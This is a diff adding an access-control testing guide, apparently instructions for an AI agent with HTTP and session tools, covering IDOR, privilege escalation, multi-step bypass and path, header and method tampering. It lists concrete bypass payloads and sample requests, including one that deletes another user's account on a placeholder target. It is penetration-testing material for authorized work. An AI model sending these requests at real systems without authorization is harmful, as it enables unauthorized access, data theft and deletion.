@@ -1,0 +1,140 @@
+=== Access Control Testing ===
+
+Access control vulnerabilities allow attackers to access resources or perform actions
+beyond their intended permissions.
+
+ATTACK TYPES
+
+  Type                 Description                          Severity
+  ────                 ───────────                          ────────
+  IDOR                 Direct object reference w/o authz    High
+  Vertical escalation  User gains admin privileges          Critical
+  Horizontal escalation User accesses another user's data   High
+  Multi-step bypass    Skip steps in protected workflows    Medium-High
+  Parameter tampering  Modify hidden/readonly parameters    Medium-High
+  Referer bypass       Access control based on Referer      Medium
+
+SESSION SETUP (REQUIRED)
+
+  Create sessions for different privilege levels:
+
+  session_create(name="unauthenticated")
+  session_create(name="attacker")         — account you control
+  session_create(name="victim")           — target account (e.g., wiener:peter)
+  session_create(name="admin")            — elevated account
+
+  Authenticate each, then use session_switch() before every test request.
+
+IDOR (INSECURE DIRECT OBJECT REFERENCE)
+
+  Common patterns:
+    Numeric ID:   /api/users/123          → try 124, 125, ...
+    GUID:         /api/orders/550e8400... → substitute victim's GUID
+    Filename:     /download?file=report_123.pdf → change ID portion
+    Encoded ID:   /view?id=MTIz (base64) → decode, modify, re-encode
+    Composite:    /api/org/5/user/10      → test each component
+
+  Test across CRUD operations:
+    GET    /api/users/{victim_id}
+    GET    /api/orders/{victim_order_id}
+    GET    /download?file=invoice_{victim_id}.pdf
+    POST   /api/users/{victim_id}/update
+    PUT    /api/orders/{victim_order_id}
+    DELETE /api/users/{victim_id}/address/1
+
+  MCP workflow:
+    session_switch(name="victim")
+    → send_http1_request(...) → extract victim's object IDs from response
+    session_switch(name="attacker")
+    → send_http1_request(content="GET /api/users/{victim_id} HTTP/1.1\nHost: target.com\n\n",
+        targetHostname="target.com", targetPort=443, usesHttps=true)
+    → if 200 with victim data = IDOR confirmed
+
+  When IDs are GUIDs, look for leakage in:
+    /api/users, /api/search?q=*, /api/orders/recent
+    JavaScript files, audit logs, search results
+
+VERTICAL PRIVILEGE ESCALATION
+
+  Direct URL access — test admin endpoints with low-priv session:
+    /admin, /admin/users, /administrator, /management
+    /console, /api/admin/users, /api/v1/admin/config
+    /actuator, /actuator/env
+
+  Role parameter manipulation:
+    POST /register with role=admin
+    POST /my-account/update with role=admin
+    POST /api/users/profile with {"roleid":1,"isAdmin":true}
+
+  Common role parameters:
+    role=admin  admin=true  isAdmin=true  isadmin=1
+    roleid=1  access_level=10  privilege=admin  group=admin
+
+  Method override — bypass DELETE restrictions:
+    X-HTTP-Method-Override: DELETE
+    X-Method-Override: DELETE
+    X-HTTP-Method: DELETE
+    _method=DELETE  (as POST body parameter)
+
+HORIZONTAL PRIVILEGE ESCALATION
+
+  Same privilege level, different users.
+  Test with two accounts: can user A access user B's resources?
+
+  session_switch(name="attacker")
+  → send_http1_request(content="GET /api/orders/{victim_order_id} HTTP/1.1\n...",
+      targetHostname="target.com", targetPort=443, usesHttps=true)
+  → if 200 with victim data = horizontal escalation
+
+MULTI-STEP PROCESS BYPASS
+
+  Applications may only check authorization on the first step.
+
+  Example: Admin user deletion
+    Step 1: GET /admin/delete?username=carlos  (shows confirmation — protected)
+    Step 2: POST /admin/delete (confirm=yes)    (actually deletes — unprotected?)
+
+  Test: Skip directly to step 2 with low-priv session.
+  send_http1_request(content="POST /admin/delete HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=carlos&confirm=yes",
+    targetHostname="target.com", targetPort=443, usesHttps=true)
+
+PATH-BASED BYPASS TECHNIQUES
+
+  /admin   /Admin   /ADMIN   /admin/   /admin//   //admin
+  /./admin   /admin/./   /.//admin
+  /admin%20   /admin%00   /%61dmin
+  /admin;.css   /admin.json   /admin?   /admin#
+
+CUSTOM HEADER BYPASS
+
+  Some apps trust internal traffic headers:
+    X-Original-URL: /admin
+    X-Rewrite-URL: /admin
+    X-Forwarded-For: 127.0.0.1
+    X-Real-IP: 127.0.0.1
+    X-Custom-IP-Authorization: 127.0.0.1
+
+HTTP METHOD MANIPULATION
+
+  Test alternative methods on protected endpoints:
+    GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS, TRACE
+
+  Some frameworks only restrict specific methods.
+
+REFERER-BASED ACCESS CONTROL
+
+  Test admin endpoints without Referer, then with spoofed Referer:
+    Referer: https://TARGET/admin
+
+  If spoofed Referer grants access = vulnerability.
+
+TESTING CHECKLIST
+
+  [ ] Create multi-privilege session set
+  [ ] Test all admin endpoints with low-priv sessions
+  [ ] Test all user endpoints with other user's IDs (IDOR)
+  [ ] Check for role/privilege parameters in all requests
+  [ ] Test multi-step processes for missing validation
+  [ ] Test path/method/header bypass techniques
+  [ ] Verify results by comparing response bodies across privilege levels
+  [ ] Document all access control findings with request/response
